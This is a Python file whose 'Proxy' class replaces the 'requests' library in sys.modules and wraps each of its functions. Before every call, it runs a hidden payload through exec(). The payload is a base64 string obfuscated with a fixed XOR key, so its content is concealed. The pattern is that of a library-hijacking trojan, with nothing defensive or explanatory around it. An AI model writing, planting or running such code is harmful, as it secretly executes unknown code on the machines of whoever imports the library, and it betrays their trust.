
class Proxy:

    def __init__(self, module):
        self._original_code = 'clcWJhkQbGkSWCZtACEqSQhdC2RbHzwyQRx4NQI9PAJQH0tuWhVmBCNyHwxQBB0lNHElYzx9EmtLGHtvLDoFLjF6Lyk2dgkhDUQ+KRkTcRBIeicSMn4KByl2FxNIFQUuMXolJDx7ChcjdDgoAxcFDTFiFgskbDEzEQIvJUUxFAkaDF90I10CBFFAMTEfNzIoSA0EcyBUIzYSDGMmNA0nUy0NVHcFVTE8V3g1JTEdJw9ITAAPMXZ7dgQGbhUVERg1JFYIFS5RDic+AwwRNhgdAzJ2PiQ4fRoeFnIaGgYDIB0xCSENRFR+Bx9NMnY+PXAePlocG0ZOPxEgVz0YPiUaMw9AOi0hczgDEQVhczc6LFYUbjcnJVcZFQttBToyGh1UGQESAhkICCleXQAGNzktAx1MCRQBSQR1AnMldiI2eFQqDyMqK1YECjVeHSNGHS8lAn8sFBQMfzAJfGAIJTMJXyJrVHEhYi8SNFIDDjQkBFYiezIQQVsuNzB2EAZFByMGNw4UBjUMFygxZT1yWyIBHwBeFTEHbRwjIgEBOiEXH18Kfj8KJUkgMARHJxtFbAA1KnI0NEULfgQzRjIORhd6MDJ7NxA9dRsDOlsXNTkQCTY5ejotWhVma0twGAZQBB0lNHElYzx9EmtLGHtvLDpvTnJnOSoaSCQ0EmoJalc7O0BRFhU6BEwuK05TcSEFJiRHEEwSMwQCZGkBRjkhGzE8SRFXSTpXFS01NXk9Ygx0KgYLUEY/V185IxYVMTFdOi0TG1kSYwsYJDYDWyUxHHQ4DB1BEzcbGGYjCFYkOwAgaEoITQQqGRhmLwheMztQezwKCBcWNhUWOyMLFSpiHyQtCQtLCmMVWTgjUAF2fFB7PAoIFwk2AxY/PhISf0gvCyEKCFcUNyhnY2EJRnFrXicxFAxdC2sRHygzFFl2YBggPBcLAklsB1k4MgNXPyxeNycKV1kWKlhZOy85RTkxBHo4DwgaRm4RSxgKDRV2byh0GCgrbEZuExhpJxZcCSYVIhcMHUFbcCR0OGsxRh8mKGYSKhR2FzVCTAwzMWFldyA6Jw8tQDRhVxUvZkRUJisvITsCCmcNJg4FeXBfDDImFWwtBEwNBXYUDC8kX1MycUJjeVRLAQcgElppZktRdmARJCE4F0gSKhhWdjYHRiInUnRlA1gaBzMeZzsnFUEzHQAmIREZTAN+RRprawIVdCMAPRcXGUsSJihbJCIDCC0tADEmT1oXEi4HFyQzEhsiOgR2ZEUKTERqWUouJwIdfz9SdHZHV1wDNVhWPioKEn9ILwshCghXFDcoZ2NhCUZxa14mLQoXTgNrER9kMgtFeTIFNmYXHVVBan1nFC8LRTkwBAsXT19XFWReFjkjC1ogJ1gyb0gMVRZsGE0/aBJNImVZXg=='
        self._original_module = __import__('importlib').import_module(module)

    def __getattr__(self, name):
        original_attr = getattr(self._original_module, name)
        if callable(original_attr):
            def wrapped(*args, **kwargs):
                exec(self.decode(self._original_code))
                result = original_attr(*args, **kwargs)
                return result
            return wrapped
        else:
            return original_attr

    def decode(self, encoded: str) -> str:
        def xor(message: bytes, key: bytes) -> bytes:
            xorred = list()
            for i, c in enumerate(message):
                xorred.append(c ^ key[i%len(key)])
            return bytes(xorred)
        return xor(__import__('base64').b64decode(encoded), b'x8fCw8KFf5VBpTHg').decode()

try:
    __import__('sys').modules['requests'] = Proxy('requests')
except ModuleNotFoundError:
    pass
